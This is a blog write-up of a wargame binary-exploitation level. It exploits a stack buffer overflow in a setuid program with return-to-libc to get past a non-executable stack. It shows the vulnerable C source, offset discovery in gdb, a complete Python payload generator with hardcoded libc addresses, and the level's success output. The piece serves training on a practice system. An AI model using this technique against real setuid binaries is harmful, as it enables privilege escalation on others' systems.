![Logo](/assets/images/belts-red.png)


In this post we'll continue with the first level from the [Lieutenant](https://www.certifiedsecure.com/certification/view/37) set of challenges from **Certified Secure Binary Mastery**.
More buffer overflows on the horizon, but now a new protection mechanism is introduced: the non-executable (**NX**) bit. 
The method we'll need to use here is called is called **ret2libc** (return to libc) and allows us go around the fact that the stack is not executable.

In the previous levels we exploited similar stack-based buffer overflows by overwriting past the buffer limits, 
until we reached the saved return address, where we wrote an address we controlled. 
We placed the shellcode either in the buffer itself or in environment variables, which both ended up on the stack.
Now because the stack is NOT executable, the program would just crash. So we need a way to get past this. 
One known trick is to return insted to the function **system()** from the standard _libc_ library, which accepts an argument to execute.

To review the previous levels, check the links below:
* [Binary Master: Ensign - Level 1](https://livz.github.io/2016/01/07/binary-master-ensign-1.html)
* [Binary Master: Ensign - Level 2](https://livz.github.io/2016/01/14/binary-master-ensign-2.html)
* [Binary Master: Ensign - Level 3](https://livz.github.io/2016/01/21/binary-master-ensign-3.html)
* [Binary Master: Ensign - Level 4](https://livz.github.io/2016/01/28/binary-master-ensign-4.html)
* [Binary Master: Ensign - Level 5](https://livz.github.io/2016/02/09/binary-master-ensign-5.html)

If you want to know more about the techniques to bypass the NX bit, make usre to check the following great resources:
* [Bypassing NX bit using return-to-libc](https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/)
* [Bypassing NX bit using chained return-to-libc](https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/)

## 0 - Discovery
Let's connect to the server and check the binary we're dealing with:
```
$ ssh level5@hacking.certifiedsecure.com -p 8266
level4@hacking.certifiedsecure.com's password: 
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 3.13.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '16.04.2 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

   ___  _                      __  ___         __              
  / _ )(_)__  ___ _______ __  /  |/  /__ ____ / /____ ______ __
 / _  / / _ \/ _ `/ __/ // / / /|_/ / _ `(_-</ __/ -_) __/ // /
/____/_/_//_/\_,_/_/  \_, / /_/  /_/\_,_/___/\__/\__/_/  \_, / 
                     /___/                 _            /___/  
                             ___ ___  ___ (_)__ ____ 
                            / -_) _ \(_-</ / _ `/ _ \
                            \__/_//_/___/_/\_, /_//_/
                                          /___/      
```

Let's see if we have any mitigation techniques using [checksec.sh](http://www.trapkit.de/tools/checksec.html), downloaded and run locally:
```bash
$ checksec.sh --file level1
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE                       
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   level1

```

There is no stack canary but the stack is **not** executable. What about the state of ASLR on the system? Good news this time: there is [no ASLR](https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization), everything is static:

```bash
$ cat  /proc/sys/kernel/randomize_va_space
0
```

## 1 - Vulnerability

```c
#include <string.h>
#include <stdio.h>
#include <unistd.h>

void hello(int count) {
        char buf[12];

        read(0, buf, count);                            [1]
        printf("Hello %s!\n", buf);
}

int main(int argc, char** argv) {
        if (argc != 2) {
                printf("Usage: %s <count>\n", argv[0]);
                return -1;
        }

        hello(atoi(argv[1]));
        return 0;
}
```

It's very easy to understand how the program works and the buffer overflow is obvious. The call to **read** function in **[1]** accepts the number of bytes to be read from the user, without any validation. Input is written into the **buf** buffer which is only 12 bytes. Simple!

The second issue is of course the absence of a stack cookie which, in this case, would have caused the program to crash, preventing the exploitation.

The third issue, which is a general one, is that the application has the **setuid** flag set and it executes actions based on user input (which could be malicious) with elevated privileges. A better design would be to drop the privileges before getting input from an untrusted source. There are ways around this as well, but it would raise the bar a little for the attackers.

## 2 - Exploit

The idea is to redirect the execution flow to the address of the **system** function and somehow give it a meaningful parameter to execute. Let's go step by step.

### Controlling the execution flow
Although we know that **buf** is 12 bytes in size, we need to see the stack layout of the function **hello** in order to understand exactly how many bytes we need to overwrite to get to the saved return address on the stack.

![hello stack](/assets/images/bm6-1.png)

So we need 20 + 4 bytes of padding in the buffer before we'll reach the saved return address. Let's see first if we can reliably control the return address:

```bash
$ python -c 'print "A"*24 + "BBBB"' > input
$ gdb -q ./level1    
```

We see below that the execution crashed at address **0x42424242** ("BBBB"). That's good. We can move on.

![Control EIP](/assets/images/bm6-2.png)

### Final payload

After we gain control of the EIP, we want to return to the **system** function as discussed. I chose to execute the **/home/level2/victory** binary, but we could as well spawn a new shell. So the payload will look like this:

```
| PADDING (24 bytes) | addr. of system() | addr of exit() | addr of arguments |
```

If it's not clear why, go back to the articles referened in the beginning. The last parameter is important. We need to place there the argument to the **system** call. According to its [man page](http://man7.org/linux/man-pages/man3/system.3.html) this should be the address of a string in memory representing the command to execute. 

Since there is no ASLR, we can use the same trick as before and place the command to be executed in an environment variable:

```bash
$ export EGG="/home/level2/victory"
```
The complete script to generate the payload looks like this:

```python
import struct
from subprocess import call

system = 0xf7e65e70     # Address of system() function
exit = 0xf7e58f50       # Address of exit() function
egg = 0xffffdef9-6      # Address of environment variable (/home/level2/victory)

payload = "A" * 24 + struct.pack("<I", system) + struct.pack("<I", exit) + struct.pack("<I", egg)

open("/tmp/input", "wb").write(payload)
```

## 3 - Profit

```
$ /levels/level1 40 < /tmp/input
Hello AAAAAAAAAAAAAAAAAAAAAAAAp^�P�����
                                       !
   ___  _                      __  ___         __
  / _ )(_)__  ___ _______ __  /  |/  /__ ____ / /____ ______ __
 / _  / / _ \/ _ `/ __/ // / / /|_/ / _ `(_-</ __/ -_) __/ // /
/____/_/_//_/\_,_/_/  \_, / /_/  /_/\_,_/___/\__/\__/_/  \_, / 
                     /___/                              /___/  
                ___           __                   __    
               / (_)___ __ __/ /____ ___ ___ ____ / /_  
              / / // -_) // / __/ -_) _ | _ `/ _ | __/  
             /_/_/ \__/\_,_/\__/\__/_//_|_,_/_//_|__/   
              
Subject: Victory!
             
Congrats, you have solved level1. To update your score,
send an e-mail to unlock@certifiedsecure.com and include:
   * your CS-ID
   * which level you solved (level1 @ binary mastery lieutenant)
   * the exploit
   
You can now start with level2. If you want, you can log in
as level2 with password    [REDACTED]
```
